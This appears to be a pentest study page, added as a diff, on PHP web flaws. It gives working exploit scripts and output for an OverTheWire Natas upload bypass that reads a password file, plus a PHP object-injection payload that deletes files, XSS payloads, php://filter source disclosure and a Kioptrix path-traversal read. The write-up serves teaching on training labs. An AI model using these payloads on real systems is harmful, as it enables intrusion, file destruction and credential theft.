@@ -1,0 +1,230 @@
+.. include:: /pentest_links.txt
+
+
+************************
+PHP & MySQL Shortcomings
+************************
+
+PHP & MySQL are both bad
+========================
+
+See `PHP: a fractal of bad design <https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/>`_ for a list of the many PHP shortcomings. It is often combined with MySQL - see `Do Not Pass This Way Again <https://grimoire.ca/mysql/choose-something-else>`_ for a list of the many problems with MySQL.
+
+
+Exploit-DB PHP vulnerabilities
+==============================
+
+Read `Web vulnerabilities to gain access to the system <https://www.exploit-db.com/papers/13017/>`_ for a good introduction to a number of clever PHP vulnerabilities.
+
+
+OWASP PHP vulnerabilites
+========================
+
+`OWASP Category:Vulnerability`_ includes a number of vulnerabilities related to PHP.
+
+`OWASP Unrestricted File Upload`_
+---------------------------------
+
+This is covered adequately elsewhere, so we mostly provide links to these references.
+
+A good & short introduction is `How to shell a server via image upload and bypass extension + real image verification <http://hackers2devnull.blogspot.com/2013/05/how-to-shell-server-via-image-upload.html>`_.
+
+The `OWASP`_ article is `OWASP Unrestricted File Upload`_, especially the section "Weak Protection Methods and Methods of Bypassing". Read "Using Black-List for Files' Extensions", "Using White-List for Files' Extensions", "Using "Content-Type" from the Header", and "Using a File Type Recogniser".
+
+For "Using a File Type Recogniser" we provide one concrete example for their first method: "Sometimes the recognisers just read the few first characters (or header) of the files in order to check them. In this case, an attacker can insert the malicious code after some valid header." Specifically, we'll use the `JPEG File Interchange Format <https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format#File_format_structure>`_ `File format structure <https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format#File_format_structure>`_ to place 11 bytes at the beginning of a PHP file to indicate it is a JPEG file:
+
+  The challenge `OverTheWire Natas <http://overthewire.org/wargames/natas/>`_ teaches the basics of serverside web security. `Natas Level 13 -> 14 <http://natas13.natas.labs.overthewire.org/>`_ (user id nata13, password "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY") is backed by a server-side script using ``exif_imagetype`` check to make sure the uploaded file is an image file. Here we bypass the image type check by setting the first 11 bytes of the PHP file to the JFIF header values, tricking the server into uploading php that displays the contents of the file :file:`/etc/natas_webpass/natas14` (password for the next Natas level). The php exploit code is:
+
+  .. code-block:: bash
+    :emphasize-lines: 1-5
+
+    # JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + "JFIF" + \x00
+    JFIF_HEADER="\xFF\xD8\xFF\xE0\x00\x10JFIF\x00"
+    EXPLOIT='<?php passthru("echo -n PASS; cat /etc/natas_webpass/natas14"); ?>'
+    echo -e "$JFIF_HEADER$EXPLOIT" > natas14.php
+    # upload to web server and capture saved filename
+    upload=$( \
+      curl --silent --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+        --form filename=natas14.php \
+        --form uploadedfile=@natas14.php \
+        --form submit="Upload File" \
+        http://natas13.natas.labs.overthewire.org/index.php \
+      | grep 'a href="upload/' \
+    )
+    file=${upload#*upload/}
+    file=${file%%\"*}
+    curl --silent \
+         --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+         http://natas13.natas.labs.overthewire.org/upload/$file |
+    tail -n1 | tr -cd '[:print:]'  | sed -e 's/^.*PASS//;s/$/\
+    /'
+
+  Running this gives the Natas 14 password:
+
+  .. code-block:: console
+    :emphasize-lines: 1-5,21
+
+    hacker@kali:~$ # JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + "JFIF" + \x00
+    hacker@kali:~$ JFIF_HEADER="\xFF\xD8\xFF\xE0\x00\x10JFIF\x00"
+    hacker@kali:~$ EXPLOIT='<?php passthru("echo -n PASS; cat /etc/natas_webpass/natas14"); ?>'
+    hacker@kali:~$ echo -e "$JFIF_HEADER$EXPLOIT" > natas14.php
+    hacker@kali:~$ # upload to web server and capture saved filename
+    hacker@kali:~$ upload=$( \
+    >   curl --silent --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+    >     --form filename=natas14.php \
+    >     --form uploadedfile=@natas14.php \
+    >     --form submit="Upload File" \
+    >     http://natas13.natas.labs.overthewire.org/index.php \
+    >   | grep 'a href="upload/' \
+    > )
+    hacker@kali:~$ file=${upload#*upload/}
+    hacker@kali:~$ file=${file%%\"*}
+    hacker@kali:~$ curl --silent \
+    >      --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+    >      http://natas13.natas.labs.overthewire.org/upload/$file |
+    > tail -n1 | tr -cd '[:print:]'  | sed -e 's/^.*PASS//;s/$/\
+    > /'
+    Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+  So we bypassed the image file check by setting the first 11 bytes of the PHP file to those indicating a JPEG file.
+
+
+`OWASP PHP Object Injection`_
+-----------------------------
+
+From `OWASP PHP Object Injection`_:
+
+  PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.
+
+  In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:
+
+  * The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a "POP chain".
+  * All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.
+
+We'll provide a little bit more detail on OWASP's Example 1. __destruct() is one of PHP's `Magic Methods <http://php.net/manual/en/language.oop5.magic.php>`_. The idea is there's a PHP class Example1 that gets unserialized (after presumably being serialized). It contains a __destruct() function that deletes the object's cache file. The exploit tampers with a saved Example1 serialization to change the file to an arbitrary file, causing that file to be deleted:
+
+.. code-block:: php5
+  :emphasize-lines: 3,12-13,19
+
+  class Example1
+  {
+     public $cache_file;
+
+     function __construct()
+     {
+        // some PHP code...
+     }
+
+     function __destruct()
+     {
+        $file = "/var/www/cache/tmp/{$this->cache_file}";
+        if (file_exists($file)) @unlink($file);
+     }
+  }
+
+  // some PHP code...
+
+  $user_data = unserialize($_GET['data']);
+
+  // some PHP code...
+
+The object Example1 deletes it's $cache_file upon destruction and the exploiter wants instead to delete a PHP file. All they need do is create a serialized Example1 where $cache_file is set to a reference to the PHP file to be deleted (say :file:`../../index.php` to make the :file:`/var/www/cache/tmp/$file` reference delete :file:`/var/www/index.php`). This is done with a short PHP script declaring a class Example1, modifying the $cache_file variable as needed, then getting the serialized value (to be used later as input to a vulnerable PHP script):
+
+.. code-block:: php5
+  :emphasize-lines: 2,18-20
+
+  <?php
+  class Example1
+  {
+     public $cache_file;
+
+     function __construct()
+     {
+        // some PHP code...
+     }
+
+     function __destruct()
+     {
+        $file = "/var/www/cache/tmp/{$this->cache_file}";
+        if (file_exists($file)) @unlink($file);
+     }
+  }
+
+  $temp = new Example1();
+  $temp->cache_file = "../../index.php";
+  print serialize($temp);
+  ?>
+
+Running this gives the serialized output ``O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}``. So then the following URL will cause :file:`index.php` to be deleted when the unserialized data object is destroyed:
+
+.. code-block:: text
+  :emphasize-lines: 1
+
+  http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
+
+
+PHP Protocols and Wrappers
+==========================
+
+`Supported Protocols and Wrappers <http://in.php.net/wrappers.php>`_ currently lists: file://, http://, ftp://, php://, zlib://, data://, glob://, phar://, ssh2://, rar://, ogg://, and expect://. Not all these are supported by all PHP servers, but the most important 2 for us are data:// and php://.
+
+data://
+-------
+
+The PHP protocols are similar to `Data URI scheme <https://en.wikipedia.org/wiki/Data_URI_scheme>`_. There, Google's `XSS game <https://xss-game.appspot.com/>`_ (solutions at :ref:`XSSGame`) level 6 can be solved using `https://xss-game.appspot.com/level6/frame#data:text/javascript,alert("boo") <https://xss-game.appspot.com/level6/frame#data:text/javascript,alert("boo")>`_. Instead of loading a JavaScript file from some remote location, ``data:text/javascript,...`` supplies the data. Level 5 can be solved via ``https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("boo")``, again using ``javascript:alert("boo")`` to specify the JavaScript directly instead of a file.
+
+php://
+------
+
+php:// allows accessing various I/O streams.
+
+php://filter
+------------
+
+php://filter permits the application of a filter to a stream. The `List of Available Filters <http://in.php.net/manual/en/filters.php>`_ includes `String Filters <http://in.php.net/manual/en/filters.string.php>`_ (see `String Functions <http://in.php.net/manual/en/ref.strings.php>`_), `Conversion Filters <http://in.php.net/manual/en/filters.convert.php>`_ (most importantly base64_encode() and base64_decode()), `Compression Filters <http://in.php.net/manual/en/filters.compression.php>`_, and `Encryption Filters <http://in.php.net/manual/en/filters.encryption.php>`_. A sequence of filters can be piped together using "|":
+
+.. code-block:: php
+  :emphasize-lines: 1
+
+  readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.example.com");
+
+Challenge :ref:`OwlNest` uses php://filter to download instead of execute PHP files by converting them to base64 (making them not PHP source):
+
+.. code-block:: bash
+  :emphasize-lines: 7-8
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  URL='http://owlnest.com/uploadform.php'
+  PHP=uploadform.php
+  curl --silent --cookie $COOKIES \
+    $URL?page=php://filter/convert.base64-encode/resource=$PHP \
+    | base64 -d -w 0 \
+    | tee $PHP
+
+Without the php://filter/convert.base64-encode the PHP file would be executed and the contents would not be viewable.
+
+php://fd
+--------
+
+php://fd allows direct access to a file descriptor like php://fd/9, though sometimes it will have to be referenced via :file:`/proc/self/fd/9`. Challenge :ref:`Kioptrix4` uses :file:`/proc/self/fd/9` which is mapped to the PHP session data:
+
+.. code-block:: console
+  :emphasize-lines: 2-3,5-
+
+  # on kioptrix4 - cat of /var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76
+  john@Kioptrix4:/var/lib/php5$ sudo cat sess_e67efa732b9b15b6def9824e1200db76
+  myusername|s:4:"user";mypassword|s:12:"' OR 1=1-- -";
+
+  # on kali - fetch /proc/self/fd/9 using the matching cookie
+  hacker@kali:~/pentest/kioptrix4/exploit$ cat $COOKIES
+  kioptrix4.com	FALSE	/	FALSE	0	PHPSESSID	e67efa732b9b15b6def9824e1200db76
+  hacker@kali:~/pentest/kioptrix4/exploit$ FILE='../../../../../../proc/self/fd/9'
+  hacker@kali:~/pentest/kioptrix4/exploit$ URL="http://kioptrix4.com/member.php?username=$FILE%00"
+  hacker@kali:~/pentest/kioptrix4/exploit$ curl --silent --cookie $COOKIES -L $URL
+  myusername|s:4:"user";mypassword|s:12:"' OR 1=1-- -";
+
+So kioptrix4 uses :file:`fd/9` to access the PHP session data.
+
